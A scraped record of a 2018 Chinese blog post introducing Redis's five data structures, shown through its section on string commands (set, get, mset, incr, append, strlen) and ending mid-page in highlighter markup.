{"title": "Redis 避不开的五种数据结构", "url": "http://blog.jobbole.com/114407/", "create_date": "2018/09/25", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "url_object_id": "7dac2cf4ba2ba6db98a928d39b6db6b4", "praise_nums": 1, "fav_nums": 0, "comment_nums": 0, "tags": "IT技术,Redis,数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/editorial-story/blog/2120649\">裴彬</a>   </div><p>Redis 中有 5 种数据结构，分别是字符串（String）、哈希（Hash）、列表（List）、集合（Set）和有序集合（Sorted Set），因为使用 Redis 场景的开发中肯定是无法避开这些基础结构的，所以熟练掌握它们也就成了一项必不可少的能力。本文章精要地介绍了 Redis 的这几种数据结构，主要覆盖了它们各自的定义、基本用法与相关要点。</p>\n<p> </p>\n<h1>字符串类型</h1>\n<p>字符串是 Redis 中的最基础的数据结构，我们保存到 Redis 中的 key，也就是键，就是字符串结构的。除此之外，Redis 中其它数据结构也是在字符串的基础上设计的，可见字符串结构对于 Redis 是多么重要。</p>\n<p>Redis 中的字符串结构可以保存多种数据类型，如：简单的字符串、JSON、XML、二进制等，但有一点要特别注意：在 Redis 中字符串类型的值最大只能保存 512 MB。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/9d9cd14b6807a6870091f4121eb1b71b.png\" width=\"679\" height=\"391\"></p>\n<p> </p>\n<h2>命令</h2>\n<p>下面通过命令了解一下对字符串类型的操作：</p>\n<p> </p>\n<h3>1.设置值</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0891eb457815227\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset key value [EX seconds] [PX milliseconds] [NX|XX]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0891eb457815227-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0891eb457815227-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-e\">key </span><span class=\"crayon-i\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">EX </span><span class=\"crayon-v\">seconds</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">PX </span><span class=\"crayon-v\">milliseconds</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">NX</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">XX</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/9ffd5b6bd4a94a2004172411e1dde293.png\" width=\"347\" height=\"65\"></p>\n<p>set 命令有几个非必须的选项，下面我们看一下它们的具体说明：</p>\n<ul>\n<li>EX seconds：为键设置秒级过期时间</li>\n<li>PX milliseconds：为键设置毫秒级过期时间</li>\n<li>NX：键必须不存在，才可以设置成功，用于添加</li>\n<li>XX：键必须存在，才可以设置成功，用于更新</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/54e6005c45131581b6553c3930662d1d.png\" width=\"531\" height=\"322\"></p>\n<p>set 命令带上可选参数 NX 和 XX 在实际开发中的作用与 setnx 和 setxx 命令相同。我们知道 setnx 命令只有当 key 不存在的时候才能设置成功，换句话说，也就是同一个 key 在执行 setnx 命令时，只能成功一次，并且由于 Redis 的单线程命令处理机制，即使多个客户端同时执行 setnx 命令，也只有一个客户端执行成功。所以，基于 setnx 这种特性，<strong>setnx 命令可以作为分布式锁的一种解决方案</strong>。</p>\n<p>而 setxx 命令则可以在安全性比较高的场景中使用，因为 set 命令执行时，会执行覆盖的操作，而 setxx 在更新 key 时可以确保该 key 已经存在了，所以为了保证 key 中数据类型的正确性，可以使用 setxx 命令。</p>\n<p> </p>\n<h3>2.获取值</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0891f5869110892\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nget key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0891f5869110892-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0891f5869110892-1\"><span class=\"crayon-e\">get </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/8f9a0c379ca2eb09d1f6f53b96080a42.png\" width=\"406\" height=\"203\"></p>\n<p> </p>\n<h3>3.批量设置值</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0891fb828770134\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmset key value</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0891fb828770134-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0891fb828770134-1\"><span class=\"crayon-e\">mset </span><span class=\"crayon-e\">key </span><span class=\"crayon-v\">value</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/201b7ebb641c63846312e468ca7edaa2.png\" width=\"369\" height=\"75\"></p>\n<p> </p>\n<h3>4.批量获取值</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0891ff215307725\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmget key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0891ff215307725-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0891ff215307725-1\"><span class=\"crayon-e\">mget </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/fce0983b0c1aa16c6c5dcf8dd3c48c54.png\" width=\"346\" height=\"131\"></p>\n<p>如果有些键不存在，那么它的值将为 nil，也就是空，并且返回结果的顺序与传入时相同。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/940474bc2c12fba50c637e747a33614b.png\" width=\"317\" height=\"126\"></p>\n<p> </p>\n<h3>5.计数</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089203638464005\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nincr key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089203638464005-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089203638464005-1\"><span class=\"crayon-e\">incr </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>incr 命令用于对值做自增操作，返回的结果分为 3 种情况：</p>\n<ul>\n<li>如果值不是整数，那么返回的一定是错误</li>\n<li>如果值是整数，那么返回自增后的结果</li>\n<li>如果键不存在，那么就会创建此键，然后按照值为 0 自增， 就是返回 1<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/381b07477bc8272a7e5c814545bda81b.png\" width=\"560\" height=\"282\"></li>\n</ul>\n<p>除了有 incr 自增命令外，Redis 中还提供了其它对数字处理的命令。例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089206741829364\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndecr key 自减\r\nincrby kek increment 自增指定数字\r\ndecrby key decrement 自减指定数字\r\nincrbyfloat key increment 自增浮点数</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089206741829364-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad089206741829364-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089206741829364-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad089206741829364-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089206741829364-1\"><span class=\"crayon-e\">decr </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span>自减</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad089206741829364-2\"><span class=\"crayon-e\">incrby </span><span class=\"crayon-e\">kek </span><span class=\"crayon-i\">increment</span><span class=\"crayon-h\"> </span>自增指定数字</div><div class=\"crayon-line\" id=\"crayon-5bab6ad089206741829364-3\"><span class=\"crayon-e\">decrby </span><span class=\"crayon-e\">key </span><span class=\"crayon-i\">decrement</span><span class=\"crayon-h\"> </span>自减指定数字</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad089206741829364-4\"><span class=\"crayon-e\">incrbyfloat </span><span class=\"crayon-e\">key </span><span class=\"crayon-i\">increment</span><span class=\"crayon-h\"> </span>自增浮点数</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/ff82cbf2a06dc2e4ee7dba6dd47d9573.png\" width=\"446\" height=\"258\"></p>\n<p> </p>\n<h3>6.追加值</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08920a359046458\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nappend key value</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08920a359046458-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08920a359046458-1\"><span class=\"crayon-e\">append </span><span class=\"crayon-e\">key </span><span class=\"crayon-v\">value</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>append 命令可以向字符串尾部追加值。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/9921457864deb9dacb2dad1332411e29.png\" width=\"395\" height=\"167\"></p>\n<p> </p>\n<h3>7.字符串长度</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08920d705974170\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstrlen key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08920d705974170-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08920d705974170-1\"><span class=\"crayon-e\">strlen </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/b7e734fe22e171bdc239d354905fca26.png\" width=\"413\" height=\"197\"></p>\n<p>由于每个中文占用 3 个字节，所以 jilinwula 这个键，返回是字符串长度为 12，而不是 4。</p>\n<p> </p>\n<h3>8.设置并返回原值</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089210985722097\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 